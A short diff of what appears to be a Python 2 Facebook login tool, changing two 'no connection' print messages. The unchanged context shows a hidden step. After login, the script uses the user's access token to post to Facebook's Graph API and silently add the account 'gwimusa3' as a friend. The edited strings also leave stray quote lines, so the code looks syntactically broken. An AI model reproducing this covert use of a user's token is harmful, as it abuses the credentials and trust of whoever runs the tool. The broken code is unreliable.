@@ -126,7 +126,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91m There is no connection
+			print"\n\033[1;96m[!] \x1b[1;91mThere is no connection"
 
 "
 			keluar()
@@ -155,7 +155,7 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mThere is no connection
+				print"\n\033[1;96m[!] \x1b[1;91mThere is no connection"
 
 "
 				keluar()
